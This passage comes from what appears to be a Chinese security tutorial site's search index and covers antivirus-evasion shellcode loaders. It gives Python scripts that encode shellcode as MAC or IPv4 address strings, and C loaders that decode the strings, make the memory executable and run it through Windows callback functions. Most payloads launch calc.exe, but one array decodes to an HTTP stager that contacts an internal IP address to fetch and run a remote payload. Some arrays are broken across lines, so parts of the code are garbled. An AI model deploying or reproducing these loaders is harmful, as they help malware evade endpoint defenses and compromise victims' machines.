(!NT_SUCCESS(STATUS)) {\n   printf(\"[!] RtlEthernetStringToAddressA failed in %s result %x (%u)\", buf[i], STATUS, \n   GetLastError());\n   return FALSE;\n  }\n  ptr += 16;\n }\n // \u4fee\u6539\u5185\u5b58\u5c5e\u6027\n DWORD pflOldProtect = 0;\n // \u53ef\u4ee5\u6267\u884c\u7684\u5c5e\u6027\n myVp(alloc_mem, sizeof(buf) * 16, PAGE_EXECUTE, &amp;pflOldProtect);\n // \u56de\u8c03\u51fd\u6570\u6267\u884c\n myEn((DATEFMT_ENUMPROCA)alloc_mem, NULL, NULL);\n return 0;\n}\n</code></pre>"},{"location":"CTF/Antimalware_evasion/AV/Article5/index.html#92mac","title":"9.2mac","text":"<p>shellcode_to_mac.py:</p> <pre><code># \u6307\u5b9a\u6587\u4ef6\u7f16\u7801\u4e3autf-8\uff0c\u786e\u4fdd\u4ee3\u7801\u5728\u5904\u7406\u5b57\u7b26\u4e32\u65f6\u4f7f\u7528\u6b63\u786e\u7684\u7f16\u7801\u683c\u5f0f\n# coding = utf-8\n\nimport ctypes  # \u5bfc\u5165ctypes\u5e93\uff0c\u7528\u4e8e\u4e0eWindows API\u8fdb\u884c\u4ea4\u4e92\nimport sys  # \u5bfc\u5165sys\u5e93\uff0c\u4f46\u5728\u8fd9\u6bb5\u4ee3\u7801\u4e2d\u6ca1\u6709\u5b9e\u9645\u7528\u5230\n\n# Input your shellcode like:\\xfc\\x48\\x83\\xe4\\xf0\\xe8\\xxx\n# \u8fd9\u91cc\u5b9a\u4e49\u4e86shellcode\uff0c\u7528\u5b57\u8282\u5b57\u7b26\u4e32\u7684\u5f62\u5f0f\u8868\u793a\nshellcode = b\"\\xfc\\x48\\x83\\xe4\\xf0\\xe8\\xc0\\x00\\x00\\x00\\x41\\x51\\x41\\x50\\x52\\x51\\x56\\x48\\x31\\xd2\\x65\\x48\\x8b\\x52\\x60\\x48\\x8b\\x52\\x18\\x48\\x8b\\x52\\x20\\x48\\x8b\\x72\\x50\\x48\\x0f\\xb7\\x4a\\x4a\\x4d\\x31\\xc9\\x48\\x31\\xc0\\xac\\x3c\\x61\\x7c\\x02\\x2c\\x20\\x41\\xc1\\xc9\\x0d\\x41\\x01\\xc1\\xe2\\xed\\x52\\x41\\x51\\x48\\x8b\\x52\\x20\\x8b\\x42\\x3c\\x48\\x01\\xd0\\x8b\\x80\\x88\\x00\\x00\\x00\\x48\\x85\\xc0\\x74\\x67\\x48\\x01\\xd0\\x50\\x8b\\x48\\x18\\x44\\x8b\\x40\\x20\\x49\\x01\\xd0\\xe3\\x56\\x48\\xff\\xc9\\x41\\x8b\\x34\\x88\\x48\\x01\\xd6\\x4d\\x31\\xc9\\x48\\x31\\xc0\\xac\\x41\\xc1\\xc9\\x0d\\x41\\x01\\xc1\\x38\\xe0\\x75\\xf1\\x4c\\x03\\x4c\\x24\\x08\\x45\\x39\\xd1\\x75\\xd8\\x58\\x44\\x8b\\x40\\x24\\x49\\x01\\xd0\\x66\\x41\\x8b\\x0c\\x48\\x44\\x8b\\x40\\x1c\\x49\\x01\\xd0\\x41\\x8b\\x04\\x88\\x48\\x01\\xd0\\x41\\x58\\x41\\x58\\x5e\\x59\\x5a\\x41\\x58\\x41\\x59\\x41\\x5a\\x48\\x83\\xec\\x20\\x41\\x52\\xff\\xe0\\x58\\x41\\x59\\x5a\\x48\\x8b\\x12\\xe9\\x57\\xff\\xff\\xff\\x5d\\x48\\xba\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x48\\x8d\\x8d\\x01\\x01\\x00\\x00\\x41\\xba\\x31\\x8b\\x6f\\x87\\xff\\xd5\\xbb\\xf0\\xb5\\xa2\\x56\\x41\\xba\\xa6\\x95\\xbd\\x9d\\xff\\xd5\\x48\\x83\\xc4\\x28\\x3c\\x06\\x7c\\x0a\\x80\\xfb\\xe0\\x75\\x05\\xbb\\x47\\x13\\x72\\x6f\\x6a\\x00\\x59\\x41\\x89\\xda\\xff\\xd5\\x63\\x61\\x6c\\x63\\x2e\\x65\\x78\\x65\\x00\";\n\n# VirtualAlloc \u5728\u5185\u5b58\u4e2d\u5206\u914d\u4e00\u5757\u533a\u57df\uff0c\u5927\u5c0f\u4e3a shellcode \u7684\u957f\u5ea6\u9664\u4ee56\u518d\u4e58\u4ee517\u5b57\u8282\n# 0x3000 = MEM_COMMIT | MEM_RESERVE\uff0c0x40 = PAGE_EXECUTE_READWRITE\nmacmem = ctypes.windll.kernel32.VirtualAlloc(0, len(shellcode) / 6 * 17, 0x3000, 0x40)\n\n# \u904d\u5386shellcode\u7684\u6bcf6\u4e2a\u5b57\u8282\uff0c\u5e76\u5c06\u5176\u8f6c\u6362\u4e3a\u4ee5\u592a\u7f51\u5730\u5740\u5b57\u7b26\u4e32\nfor i in range(len(shellcode) / 6):  # shellcode\u6bcf6\u4e2a\u5b57\u8282\u4e3a\u4e00\u7ec4\n    # \u53d6\u51fashellcode\u4e2d\u7b2ci\u4e2a6\u5b57\u8282\u7684\u90e8\u5206\n    bytes_a = shellcode[i * 6: 6 + i * 6]\n    # \u8c03\u7528Windows API\u51fd\u6570RtlEthernetAddressToStringA\uff0c\u5c06\u8fd96\u4e2a\u5b57\u8282\u7684Shellcode\u8f6c\u6210\u4ee5\u592a\u7f51\u5730\u5740\u5b57\u7b26\u4e32\n    ctypes.windll.Ntdll.RtlEthernetAddressToStringA(bytes_a, macmem + i * 17)\n\n# \u8bfb\u53d6macmem\u4e2d\u8f6c\u6362\u540e\u7684\u6570\u636e\uff0c\u5c06\u5176\u6309\u5b57\u7b26\u4e32\u5f62\u5f0f\u63d0\u53d6\u51fa\u6765\uff08\u6bcf\u4e2a\u5730\u5740\u536017\u5b57\u8282\uff09\na = ctypes.string_at(macmem, len(shellcode) * 3 - 1)\n\n# \u521d\u59cb\u5316\u4e00\u4e2a\u7a7a\u7684\u5217\u8868\u6765\u4fdd\u5b58\u6bcf\u4e2a\u8f6c\u6362\u540e\u7684\u4ee5\u592a\u7f51\u5730\u5740\u5b57\u7b26\u4e32\nlst = []\n\n# \u904d\u5386\u6bcf\u4e00\u6bb517\u5b57\u8282\u7684\u5185\u5b58\u6570\u636e\uff08\u6bcf\u6bb5\u8868\u793a\u4e00\u4e2a\u4ee5\u592a\u7f51\u5730\u5740\u5b57\u7b26\u4e32\uff09\nfor i in range(len(shellcode) / 6):\n    # \u4ecemacmem\u4e2d\u83b7\u53d6\u7b2ci\u6bb5\u7684\u4ee5\u592a\u7f51\u5730\u5740\u5b57\u7b26\u4e32\uff0c\u957f\u5ea6\u4e3a17\u5b57\u8282\n    d = ctypes.string_at(macmem + i * 17, 17)\n    # \u5c06\u8be5\u5b57\u7b26\u4e32\u6dfb\u52a0\u5230\u5217\u8868lst\u4e2d\n    lst.append(d)\n\n# \u5c06\u6240\u6709\u4ee5\u592a\u7f51\u5730\u5740\u5b57\u7b26\u4e32\u8fde\u63a5\u6210\u4e00\u4e2a\u4ee5\u9017\u53f7\u5206\u9694\u7684\u5b57\u7b26\u4e32\uff0c\u5e76\u4ee5\u53cc\u5f15\u53f7\u62ec\u8d77\u6765\ns = '\",\"'.join(lst)\nprint('\"' + s + '\"')  # \u8f93\u51fa\u6700\u7ec8\u7684\u5b57\u7b26\u4e32\u7ed3\u679c\n</code></pre> <p>\u8fd0\u884c, \u6ce8\u610f python2\u8fd0\u884c</p> <pre><code>python2 shellcode_to_mac.py\n</code></pre> <pre><code>#include &lt;windows.h&gt;\n#include&lt;stdio.h&gt;\n#include &lt;ip2string.h&gt;\n#pragma comment(linker,\"/subsystem:\\\"Windows\\\" /entry:\\\"mainCRTStartup\\\"\") // \u4e0d\u663e\u793a\u9ed1\u7a97\n\n#pragma comment(lib, \"ntdll.lib\")\n#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) &gt;= 0)\nusing namespace std;\nint main() {\n const char* buf[] = { \"FC-48-83-E4-F0-E8\",};\n PCSTR lTerminator = NULL;\n    // \u7533\u8bf7\u5185\u5b58\n    LPVOID alloc_mem = VirtualAlloc(NULL, sizeof(buf) * 6, MEM_COMMIT, PAGE_READWRITE);\n    // \u8f6c\u6210\u4e4b\u524d\u683c\u5f0f\u7684sc\n    DWORD_PTR ptr = (DWORD_PTR)alloc_mem;\n    int init = sizeof(buf) / sizeof(buf[0]);\n    for (int i = 0; i &lt; init; i++) {\n        RPC_STATUS STATUS = RtlEthernetStringToAddressA((PCSTR)buf[i], &amp;lTerminator, \n        (DL_EUI48*)ptr);\n        if (!NT_SUCCESS(STATUS)) {\n            printf(\"[!] RtlEthernetStringToAddressA failed in %s result %x (%u)\", buf[i], STATUS, \n            GetLastError());\n            return FALSE;\n        }\n        ptr += 6;\n    }\n    // \u4fee\u6539\u5185\u5b58\n    DWORD pflOldProtect = 0;\n    VirtualProtect(alloc_mem, sizeof(buf) * 6, PAGE_EXECUTE, &amp;pflOldProtect);\n    // \u56de\u8c03\u51fd\u6570\u8c03\u7528\n    EnumWindows((WNDENUMPROC)alloc_mem, NULL);\n    return 0;\n}\n</code></pre>"},{"location":"CTF/Antimalware_evasion/AV/Article5/index.html#api_1","title":"\u52a8\u6001\u8c03\u7528api","text":"<pre><code>#include &lt;windows.h&gt;\n#include&lt;stdio.h&gt;\n#include &lt;ip2string.h&gt;\n#pragma comment(linker,\"/subsystem:\\\"Windows\\\" /entry:\\\"mainCRTStartup\\\"\") // \u4e0d\u663e\u793a\u9ed1\u7a97\n#pragma comment(lib, \"ntdll.lib\")\n#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) &gt;= 0)\nusing namespace std;\ntypedef BOOL(WINAPI* lpEnumDateFormatsA)(\nDATEFMT_ENUMPROCA lpDateFmtEnumProc,\nLCID Locale,\nDWORD dwFlags\n );\ntypedef BOOL(WINAPI* lpVirtualProtect)(\nLPVOID lpAddress,\nSIZE_T dwSize,\nDWORD flNewProtect,\nPDWORD lpflOldProtect\n );\ntypedef LPVOID(WINAPI* lpVirtualAlloc)(\n LPVOID lpAddress,\nSIZE_T dwSize,\nDWORD flAllocationType,\nDWORD flProtect\n );\nint main() {\nconst char* buf[] = { \"FC-48-83-E4-F0-E8\",\"C8-00-00-00-41-51\",\"41-50-52-51-56-48\",\"31-\nD2-65-48-8B-52\",\"60-48-8B-52-18-48\",\"8B-52-20-48-8B-72\",\"50-48-0F-B7-4A-4A\",\"4D-31-\nC9-48-31-C0\",\"AC-3C-61-7C-02-2C\",\"20-41-C1-C9-0D-41\",\"01-C1-E2-ED-52-41\",\"51-48-8B-\n52-20-8B\",\"42-3C-48-01-D0-66\",\"81-78-18-0B-02-75\",\"72-8B-80-88-00-00\",\"00-48-85-C0-74-\n67\",\"48-01-D0-50-8B-48\",\"18-44-8B-40-20-49\",\"01-D0-E3-56-48-FF\",\"C9-41-8B-34-88-\n48\",\"01-D6-4D-31-C9-48\",\"31-C0-AC-41-C1-C9\",\"0D-41-01-C1-38-E0\",\"75-F1-4C-03-4C-\n24\",\"08-45-39-D1-75-D8\",\"58-44-8B-40-24-49\",\"01-D0-66-41-8B-0C\",\"48-44-8B-40-1C-\n49\",\"01-D0-41-8B-04-88\",\"48-01-D0-41-58-41\",\"58-5E-59-5A-41-58\",\"41-59-41-5A-48-\n83\",\"EC-20-41-52-FF-E0\",\"58-41-59-5A-48-8B\",\"12-E9-4F-FF-FF-FF\",\"5D-6A-00-49-BE-77\",\"69-\n6E-69-6E-65-74\",\"00-41-56-49-89-E6\",\"4C-89-F1-41-BA-4C\",\"77-26-07-FF-D5-48\",\"31-C9-48-\n31-D2-4D\",\"31-C0-4D-31-C9-41\",\"50-41-50-41-BA-3A\",\"56-79-A7-FF-D5-EB\",\"73-5A-48-89-\nC1-41\",\"B8-50-00-00-00-4D\",\"31-C9-41-51-41-51\",\"6A-03-41-51-41-BA\",\"57-89-9F-C6-FFD5\",\"EB-59-5B-48-89-C1\",\"48-31-D2-49-89-D8\",\"4D-31-C9-52-68-00\",\"02-40-84-52-52-\n41\",\"BA-EB-55-2E-3B-FF\",\"D5-48-89-C6-48-83\",\"C3-50-6A-0A-5F-48\",\"89-F1-48-89-DA-\n49\",\"C7-C0-FF-FF-FF-FF\",\"4D-31-C9-52-52-41\",\"BA-2D-06-18-7B-FF\",\"D5-85-C0-0F-85-\n9D\",\"01-00-00-48-FF-CF\",\"0F-84-8C-01-00-00\",\"EB-D3-E9-E4-01-00\",\"00-E8-A2-FF-FF-FF\",\"2F-\n6A-71-75-65-72\",\"79-2D-33-2E-33-2E\",\"32-2E-73-6C-69-6D\",\"2E-6D-69-6E-2E-6A\",\"73-00-E7-\n39-B6-A4\",\"D2-88-80-E6-2E-41\",\"A9-E1-C5-32-F3-E5\",\"C6-F6-7C-E7-D8-DA\",\"F6-1C-30-C6-\nC9-18\",\"0E-BE-2B-53-26-CD\",\"80-03-75-FE-6C-85\",\"3D-05-E9-A5-02-34\",\"59-72-7E-26-9B-\n1E\",\"19-00-41-63-63-65\",\"70-74-3A-20-74-65\",\"78-74-2F-68-74-6D\",\"6C-2C-61-70-70-\n6C\",\"69-63-61-74-69-6F\",\"6E-2F-78-68-74-6D\",\"6C-2B-78-6D-6C-2C\",\"61-70-70-6C-69-\n63\",\"61-74-69-6F-6E-2F\",\"78-6D-6C-3B-71-3D\",\"30-2E-39-2C-2A-2F\",\"2A-3B-71-3D-30-\n2E\",\"38-0D-0A-41-63-63\",\"65-70-74-2D-4C-61\",\"6E-67-75-61-67-65\",\"3A-20-65-6E-2D-\n55\",\"53-2C-65-6E-3B-71\",\"3D-30-2E-35-0D-0A\",\"52-65-66-65-72-65\",\"72-3A-20-68-74-\n74\",\"70-3A-2F-2F-63-6F\",\"64-65-2E-6A-71-75\",\"65-72-79-2E-63-6F\",\"6D-2F-0D-0A-41-\n63\",\"63-65-70-74-2D-45\",\"6E-63-6F-64-69-6E\",\"67-3A-20-67-7A-69\",\"70-2C-20-64-65-\n66\",\"6C-61-74-65-0D-0A\",\"55-73-65-72-2D-41\",\"67-65-6E-74-3A-20\",\"4D-6F-7A-69-6C-\n6C\",\"61-2F-35-2E-30-20\",\"28-57-69-6E-64-6F\",\"77-73-20-4E-54-20\",\"36-2E-33-3B-20-54\",\"72-\n69-64-65-6E-74\",\"2F-37-2E-30-3B-20\",\"72-76-3A-31-31-2E\",\"30-29-20-6C-69-6B\",\"65-20-47-\n65-63-6B\",\"6F-0D-0A-00-9D-D7\",\"28-92-EF-9A-5A-E4\",\"0C-1D-41-4B-17-A9\",\"D9-86-23-FC-\n11-FB\",\"92-CC-54-5A-BB-9B\",\"33-6E-13-A8-21-0E\",\"F2-D3-15-92-D8-DF\",\"48-6B-C2-21-A4-\n08\",\"40-FB-8C-F3-4B-94\",\"08-5A-CB-E5-D0-00\",\"41-BE-F0-B5-A2-56\",\"FF-D5-48-31-C9-\nBA\",\"00-00-40-00-41-B8\",\"00-10-00-00-41-B9\",\"40-00-00-00-41-BA\",\"58-A4-53-E5-FFD5\",\"48-93-53-53-48-89\",\"E7-48-89-F1-48-89\",\"DA-41-B8-00-20-00\",\"00-49-89-F9-41-\nBA\",\"12-96-89-E2-FF-D5\",\"48-83-C4-20-85-C0\",\"74-B6-66-8B-07-48\",\"01-C3-85-C0-75-\nD7\",\"58-58-58-48-05-AF\",\"0F-00-00-50-C3-E8\",\"9F-FD-FF-FF-31-39\",\"32-2E-31-36-38-\n2E\",\"32-33-33-2E-31-34\",\"30-00-00-01-86-A0\" };\nPCSTR lTerminator = NULL;\n// \u83b7\u53d6\u51fd\u6570\u5730\u5740\u5e76\u8d4b\u503c\u7ed9\u5bf9\u5e94\u7533\u660e\u7684\u51fd\u6570\nlpVirtualAlloc myVl = (lpVirtualAlloc)GetProcAddress(GetModuleHandle(L\"Kernel32.dll\"),\n\"VirtualAlloc\");\n lpVirtualProtect myVp =\n(lpVirtualProtect)GetProcAddress(GetModuleHandle(L\"Kernel32.dll\"), \"VirtualProtect\");\n lpEnumDateFormatsA myEn =\n (lpEnumDateFormatsA)GetProcAddress(GetModuleHandle(L\"Kernel32.dll\"), \n \"EnumDateFormatsA\");\n LPVOID alloc_mem = myVl(NULL, sizeof(buf) * 16, MEM_COMMIT, PAGE_READWRITE);\n // mac\u8f6c\u6210\u4e4b\u524d\u683c\u5f0f\u7684sc\n DWORD_PTR ptr = (DWORD_PTR)alloc_mem;\n int init = sizeof(buf) / sizeof(buf[0]);\n for (int i = 0; i &lt; init; i++) {\n  RPC_STATUS STATUS = RtlEthernetStringToAddressA((PCSTR)buf[i], &amp;lTerminator, \n  (DL_EUI48*)ptr);\n  if (!NT_SUCCESS(STATUS)) {\n   printf(\"[!] RtlEthernetStringToAddressA failed in %s result %x (%u)\", buf[i], STATUS, \n   GetLastError());\n   return FALSE;\n  }\n  ptr += 6;\n }\n // \u4fee\u6539\u5185\u5b58\u5c5e\u6027\n DWORD pflOldProtect = 0;\n // \u53ef\u4ee5\u6267\u884c\u7684\u5c5e\u6027\n myVp(alloc_mem, sizeof(buf) * 16, PAGE_EXECUTE, &amp;pflOldProtect);\n // \u56de\u8c03\u51fd\u6570\u6267\u884c\n myEn((DATEFMT_ENUMPROCA)alloc_mem, NULL, NULL);\n return 0;\n}\n</code></pre>"},{"location":"CTF/Antimalware_evasion/AV/Article5/index.html#rtlethernetstringtoaddressa-rtlethernetstringtoaddressa","title":"\u9664\u4e86RtlEthernetStringToAddressA\u8fd8\u53ef\u4ee5\u4f7f\u7528 RtlEthernetStringToAddressA","text":"<pre><code>#include &lt;windows.h&gt;\n#include&lt;stdio.h&gt;\n#include &lt;ip2string.h&gt;\n#pragma comment(linker,\"/subsystem:\\\"Windows\\\" /entry:\\\"mainCRTStartup\\\"\") // \u4e0d\u663e\u793a\u9ed1\u7a97\n\n#pragma comment(lib, \"ntdll.lib\")\n#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) &gt;= 0)\nusing namespace std;\nint main() {\n    const char* buf[] = { \"FC-48-83-E4-F0-E8\", \"C0-00-00-00-41-51\", \"41-50-52-51-56-48\", \"31-\nD2-65-48-8B-52\", \"60-48-8B-52-18-48\", \"8B-52-20-48-8B-72\", \"50-48-0F-B7-4A-4A\", \"4D-31-\nC9-48-31-C0\", \"AC-3C-61-7C-02-2C\", \"20-41-C1-C9-0D-41\", \"01-C1-E2-ED-52-41\", \"51-48-\n8B-52-20-8B\", \"42-3C-48-01-D0-8B\", \"80-88-00-00-00-48\", \"85-C0-74-67-48-01\", \"D0-50-8B-\n48-18-44\", \"8B-40-20-49-01-D0\", \"E3-56-48-FF-C9-41\", \"8B-34-88-48-01-D6\", \"4D-31-C9-48-\n31-C0\", \"AC-41-C1-C9-0D-41\", \"01-C1-38-E0-75-F1\", \"4C-03-4C-24-08-45\", \"39-D1-75-D8-\n58-44\", \"8B-40-24-49-01-D0\", \"66-41-8B-0C-48-44\", \"8B-40-1C-49-01-D0\", \"41-8B-04-88-48-\n01\", \"D0-41-58-41-58-5E\", \"59-5A-41-58-41-59\", \"41-5A-48-83-EC-20\", \"41-52-FF-E0-58-41\", \n\"59-5A-48-8B-12-E9\", \"57-FF-FF-FF-5D-48\", \"BA-01-00-00-00-00\", \"00-00-00-48-8D-8D\", \"01-\n01-00-00-41-BA\", \"31-8B-6F-87-FF-D5\", \"BB-F0-B5-A2-56-41\", \"BA-A6-95-BD-9D-FF\", \"D5-\n48-83-C4-28-3C\", \"06-7C-0A-80-FB-E0\", \"75-05-BB-47-13-72\", \"6F-6A-00-59-41-89\", \"DA-FFD5-63-61-6C\", \"63-2E-65-78-65-00\" };\nPCSTR lTerminator = NULL;\n        DWORD pflOldProtect = 0;\n        LPVOID alloc_mem = VirtualAlloc(NULL, sizeof(buf) * 6, MEM_COMMIT, PAGE_READWRITE);\n        DWORD_PTR ptr = (DWORD_PTR)alloc_mem;\n        int init = sizeof(buf) / sizeof(buf[0]);\n        for (int i = 0; i &lt; init; i++) {\n            RPC_STATUS STATUS = RtlEthernetStringToAddressA((PCSTR)buf[i], &amp;lTerminator, \n            (DL_EUI48*)ptr);\n            if (!NT_SUCCESS(STATUS)) {\n                printf(\"[!] RtlEthernetStringToAddressA failed in %s result %x (%u)\", buf[i], STATUS, \n                GetLastError());\n                return FALSE;\n            }\n            ptr += 6;\n        }\n        VirtualProtect(alloc_mem, sizeof(buf) * 6, PAGE_EXECUTE, &amp;pflOldProtect);\n        EnumWindows((WNDENUMPROC)alloc_mem, NULL);\n        return 0;\n    }\n</code></pre>"},{"location":"CTF/Antimalware_evasion/AV/Article5/index.html#93-ipv4","title":"9.3 ipv4","text":"<p>shellcode\u8f6c\u6210ipv4</p> <p>shellcode_to_ipv4.py:</p> <pre><code># coding = utf-8\nimport ctypes\nimport sys\n\n\n\n#Input your shellcode like:\\xfc\\x48\\x83\\xe4\\xf0\\xe8\\xxx\nshellcode = b\"\\xfc\\x48\\x83\\xe4\\xf0\\xe8\\xc0\\x00\\x00\\x00\\x41\\x51\\x41\\x50\\x52\\x51\\x56\\x48\\x31\\xd2\\x65\\x48\\x8b\\x52\\x60\\x48\\x8b\\x52\\x18\\x48\\x8b\\x52\\x20\\x48\\x8b\\x72\\x50\\x48\\x0f\\xb7\\x4a\\x4a\\x4d\\x31\\xc9\\x48\\x31\\xc0\\xac\\x3c\\x61\\x7c\\x02\\x2c\\x20\\x41\\xc1\\xc9\\x0d\\x41\\x01\\xc1\\xe2\\xed\\x52\\x41\\x51\\x48\\x8b\\x52\\x20\\x8b\\x42\\x3c\\x48\\x01\\xd0\\x8b\\x80\\x88\\x00\\x00\\x00\\x48\\x85\\xc0\\x74\\x67\\x48\\x01\\xd0\\x50\\x8b\\x48\\x18\\x44\\x8b\\x40\\x20\\x49\\x01\\xd0\\xe3\\x56\\x48\\xff\\xc9\\x41\\x8b\\x34\\x88\\x48\\x01\\xd6\\x4d\\x31\\xc9\\x48\\x31\\xc0\\xac\\x41\\xc1\\xc9\\x0d\\x41\\x01\\xc1\\x38\\xe0\\x75\\xf1\\x4c\\x03\\x4c\\x24\\x08\\x45\\x39\\xd1\\x75\\xd8\\x58\\x44\\x8b\\x40\\x24\\x49\\x01\\xd0\\x66\\x41\\x8b\\x0c\\x48\\x44\\x8b\\x40\\x1c\\x49\\x01\\xd0\\x41\\x8b\\x04\\x88\\x48\\x01\\xd0\\x41\\x58\\x41\\x58\\x5e\\x59\\x5a\\x41\\x58\\x41\\x59\\x41\\x5a\\x48\\x83\\xec\\x20\\x41\\x52\\xff\\xe0\\x58\\x41\\x59\\x5a\\x48\\x8b\\x12\\xe9\\x57\\xff\\xff\\xff\\x5d\\x48\\xba\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x48\\x8d\\x8d\\x01\\x01\\x00\\x00\\x41\\xba\\x31\\x8b\\x6f\\x87\\xff\\xd5\\xbb\\xf0\\xb5\\xa2\\x56\\x41\\xba\\xa6\\x95\\xbd\\x9d\\xff\\xd5\\x48\\x83\\xc4\\x28\\x3c\\x06\\x7c\\x0a\\x80\\xfb\\xe0\\x75\\x05\\xbb\\x47\\x13\\x72\\x6f\\x6a\\x00\\x59\\x41\\x89\\xda\\xff\\xd5\\x63\\x61\\x6c\\x63\\x2e\\x65\\x78\\x65\\x00\";\nipv4 = ctypes.windll.kernel32.VirtualAlloc(0, len(shellcode)/4*15, 0x3000, 0x40)\n\nfor i in range(len(shellcode)/4):\n    bytes_shellcode = shellcode[i*4:i*4+4]\n    ctypes.windll.Ntdll.RtlIpv4AddressToStringA(bytes_shellcode, ipv4+i*15)\n\na = ctypes.string_at(ipv4, len(shellcode)*4-1)\n\nl = []\nfor i in range(len(shellcode)/4):\n    d = ctypes.string_at(ipv4+i*15, 15)\n    l.append(d)\n\ns = '\",\"'.join(l)\nprint('\"'+s+'\"')\n</code></pre> <p>python2\u8fd0\u884c</p> <pre><code>python2 shellcode_to_ipv4.py\n</code></pre> <pre><code>#include &lt;windows.h&gt;\n#include&lt;stdio.h&gt;\n#include &lt;ip2string.h&gt;\n#pragma comment(linker,\"/subsystem:\\\"Windows\\\" /entry:\\\"mainCRTStartup\\\"\") // \u4e0d\u663e\u793a\u9ed1\u7a97\n\n#pragma comment(lib, \"ntdll.lib\")\n#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) &gt;= 0)\nusing namespace std;\nint main() {\n    const char* buf[] = {\n        \"252.72.131.228\",\"240.232.192.0\",\"0.0.65.81\",\"65.80.82.81\",\"86.72.49.210\",\"101.72.139.82\",\"96.7\n        2.139.82\",\"24.72.139.82\",\"32.72.139.114\",\"80.72.15.183\",\"74.74.77.49\",\"201.72.49.192\",\"172.60.\n        97.124\",\"2.44.32.65\",\"193.201.13.65\",\"1.193.226.237\",\"82.65.81.72\",\"139.82.32.139\",\"66.60.72.1\"\n        ,\"208.139.128.136\",\"0.0.0.72\",\"133.192.116.103\",\"72.1.208.80\",\"139.72.24.68\",\"139.64.32.73\",\"1.\n        208.227.86\",\"72.255.201.65\",\"139.52.136.72\",\"1.214.77.49\",\"201.72.49.192\",\"172.65.193.201\",\"1\n        3.65.1.193\",\"56.224.117.241\",\"76.3.76.36\",\"8.69.57.209\",\"117.216.88.68\",\"139.64.36.73\",\"1.208.1\n        02.65\",\"139.12.72.68\",\"139.64.28.73\",\"1.208.65.139\",\"4.136.72.1\",\"208.65.88.65\",\"88.94.89.90\",\"\n        65.88.65.89\",\"65.90.72.131\",\"236.32.65.82\",\"255.224.88.65\",\"89.90.72.139\",\"18.233.87.255\",\"255\n        .255.93.72\",\"186.1.0.0\",\"0.0.0.0\",\"0.72.141.141\",\"1.1.0.0\",\"65.186.49.139\",\"111.135.255.213\",\"187\n        .240.181.162\",\"86.65.186.166\",\"149.189.157.255\",\"213.72.131.196\",\"40.60.6.124\",\"10.128.251.22\n        4\",\"117.5.187.71\",\"19.114.111.106\",\"0.89.65.137\",\"218.255.213.99\",\"97.108.99.46\",\"101.120.101.\n        0\" };\n        PCSTR lTerminator = NULL;\n        DWORD pflOldProtect = 0;\n        LPVOID alloc_mem = VirtualAlloc(NULL, sizeof(buf), MEM_COMMIT, PAGE_READWRITE);\n        DWORD_PTR ptr = (DWORD_PTR)alloc_mem;\n        int init = sizeof(buf) / sizeof(buf[0]);\n        for (int i = 0; i &lt; init; i++) {\n            RPC_STATUS STATUS = RtlIpv4StringToAddressA((PCSTR)buf[i], FALSE, &amp;lTerminator,\n            (in_addr*)ptr);\n            if (!NT_SUCCESS(STATUS)) {\n                printf(\"[!] RtlIpv6StringToAddressA failed in %s result %x (%u)\", buf[i], STATUS,\n                GetLastError());\n                return FALSE;\n            }\n            ptr += 4;\n        }\n        VirtualProtect(alloc_mem, sizeof(buf), PAGE_EXECUTE, &amp;pflOldProtect);\n        EnumWindows((WNDENUMPROC)alloc_mem, NULL);\n        return 0;\n    }\n</code></pre>"},{"location":"CTF/Antimalware_evasion/AV/Article5/index.html#rtlipv4stringtoaddressa-rtlipv4addresstostringa","title":"\u540c\u6837\u4e5f\u6709 RtlIpv4StringToAddressA \u548c RtlIpv4AddressToStringA","text":"<pre><code>#include &lt;windows.h&gt;\n#include&lt;stdio.h&gt;\n#include &lt;ip2string.h&gt;\n#pragma comment(linker,\"/subsystem:\\\"Windows\\\" /entry:\\\"mainCRTStartup\\\"\") // \u4e0d\u663e\u793a\u9ed1\u7a97\n\n#pragma comment(lib, \"ntdll.lib\")\n#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) &gt;= 0)\nusing namespace std;\nint main() {\n    const char* buf[] = { \n        \"252.72.131.228\",\"240.232.192.0\",\"0.0.65.81\",\"65.80.82.81\",\"86.72.49.210\",\"101.72.139.82\",\"96.7\n        2.139.82\",\"24.72.139.82\",\"32.72.139.114\",\"80.72.15.183\",\"74.74.77.49\",\"201.72.49.192\",\"172.60.\n        97.124\",\"2.44.32.65\",\"193.201.13.65\",\"1.193.226.237\",\"82.65.81.72\",\"139.82.32.139\",\"66.60.72.1\"\n        ,\"208.139.128.136\",\"0.0.0.72\",\"133.192.116.103\",\"72.1.208.80\",\"139.72.24.68\",\"139.64.32.73\",\"1.\n        208.227.86\",\"72.255.201.65\",\"139.52.136.72\",\"1.214.77.49\",\"201.72.49.192\",\"172.65.193.201\",\"1\n        3.65.1.193\",\"56.224.117.241\",\"76.3.76.36\",\"8.69.57.209\",\"117.216.88.68\",\"139.64.36.73\",\"1.208.1\n        02.65\",\"139.12.72.68\",\"139.64.28.73\",\"1.208.65.139\",\"4.136.72.1\",\"208.65.88.65\",\"88.94.89.90\",\"\n        65.88.65.89\",\"65.90.72.131\",\"236.32.65.82\",\"255.224.88.65\",\"89.90.72.139\",\"18.233.87.255\",\"255\n        .255.93.72\",\"186.1.0.0\",\"0.0.0.0\",\"0.72.141.141\",\"1.1.0.0\",\"65.186.49.139\",\"111.135.255.213\",\"187\n        .240.181.162\",\"86.65.186.166\",\"149.189.157.255\",\"213.72.131.196\",\"40.60.6.124\",\"10.128.251.22\n        4\",\"117.5.187.71\",\"19.114.111.106\",\"0.89.65.137\",\"218.255.213.99\",\"97.108.99.46\",\"101.120.101.\n        0\" };\n        PCSTR lTerminator = NULL;\n        DWORD pflOldProtect = 0;\n        LPVOID alloc_mem = VirtualAlloc(NULL, sizeof(buf), MEM_COMMIT, PAGE_READWRITE);\n        DWORD_PTR ptr = (DWORD_PTR)alloc_mem;\n        int init = sizeof(buf) / sizeof(buf[0]);\n        for (int i = 0; i &lt; init; i++) {\n            RPC_STATUS STATUS = RtlIpv4StringToAddressA((PCSTR)buf[i], FALSE, &amp;lTerminator, \n            (in_addr*)ptr);\n            if (!NT_SUCCESS(STATUS)) {\n                printf(\"[!] RtlIpv6StringToAddressA failed in %s result %x (%u)\", buf[i], STATUS, \n                GetLastError());\n                return FALSE;\n    